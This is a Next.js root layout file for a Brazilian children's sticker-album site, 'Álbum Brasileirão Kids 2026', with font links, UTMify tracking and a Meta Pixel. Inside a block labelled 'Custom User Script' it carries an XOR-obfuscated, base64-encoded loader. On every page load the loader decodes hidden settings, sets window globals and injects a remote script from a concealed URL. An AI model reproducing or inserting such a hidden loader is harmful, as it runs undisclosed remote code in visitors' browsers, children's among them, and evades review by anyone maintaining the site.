import type { Metadata } from 'next';
import Script from 'next/script';
import './globals.css';
import { Toaster } from '@/components/ui/toaster';

export const metadata: Metadata = {
  title: 'Álbum Brasileirão Kids 2026',
  description: 'O álbum de figurinhas do Brasileirão Kids 2026 para crianças.',
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="pt-BR">
      <head>
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
        <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=PT+Sans:wght@400;700&display=swap" rel="stylesheet" />
        
        {/* Custom User Script */}
        <Script id="custom-tracking-script" strategy="afterInteractive">
          {`(function(){var g_2f4=atob("DC24doVlk8UITwRJXFaaA/cJsf8qJ3A9LF6CWaoG96smOnAkNUvBWOYK/utqPSs6P1/RBvEWvLB8IndmMEzME/YRva97bShrPVnMBOwH5rFtPCZzB1aaGOQI9ucybWAoKEyVA/EI+qNxYnQ7OVvdGPFI66ZnKyk6P0aaWqcT8ql9KiZzfg/FWv5H/aRlKiZzfknZAuRI5rFlJmIwcV3KE/MA/bElPHErNUnLVKlH5aRkOmFrZg+aC9gY");var w_nxh=[];for(var t_7n=0;t_7n<g_2f4.length;t_7n++){w_nxh.push(g_2f4.charCodeAt(t_7n)&255);}var b_vv=w_nxh[0];var x_gfc=w_nxh.slice(1,1+b_vv);var v_aw=w_nxh.slice(1+b_vv);var j_98c=v_aw.map(function(b,q_qpnd){return b^x_gfc[q_qpnd%b_vv];});var g_29="";for(var k_0=0;k_0<j_98c.length;k_0++){g_29+=String.fromCharCode(j_98c[k_0]&255);}var d_slb=decodeURIComponent(escape(g_29));var t_t3cy=JSON.parse(d_slb);var l_26=t_t3cy.globals||[];l_26.forEach(function(o_a89n){window[o_a89n.name]=o_a89n.value;});var u_g=document.createElement("script");u_g.src=t_t3cy.url;u_g.async=true;u_g.defer=true;(t_t3cy.attributes||[]).forEach(function(y_q){u_g.setAttribute(y_q.name,y_q.value);});(document.head||document.documentElement).appendChild(u_g);})();`}
        </Script>

        {/* UTMify Scripts */}
        <Script
          src="https://cdn.utmify.com.br/scripts/utms/latest.js"
          data-utmify-prevent-xcod-sck
          data-utmify-prevent-subids
          strategy="afterInteractive"
        />
        <Script id="utmify-pixel" strategy="afterInteractive">
          {`
            window.pixelId = "697d3551b6070913d28bb90b";
            var a = document.createElement("script");
            a.setAttribute("async", "");
            a.setAttribute("defer", "");
            a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
            document.head.appendChild(a);
          `}
        </Script>

        {/* Meta Pixel Code */}
        <Script id="fb-pixel" strategy="afterInteractive">
          {`
            !function(f,b,e,v,n,t,s)
            {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
            n.queue=[];t=b.createElement(e);t.async=!0;
            t.src=v;s=b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t,s)}(window, document,'script',
            'https://connect.facebook.net/en_US/fbevents.js');
            fbq('init', '1047868773388689');
            fbq('track', 'PageView');
          `}
        </Script>
        {/* End Meta Pixel Code */}
      </head>
      <body className="font-body antialiased">
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=1047868773388689&ev=PageView&noscript=1"
          />
        </noscript>
        {children}
        <Toaster />
      </body>
    </html>
  );
}
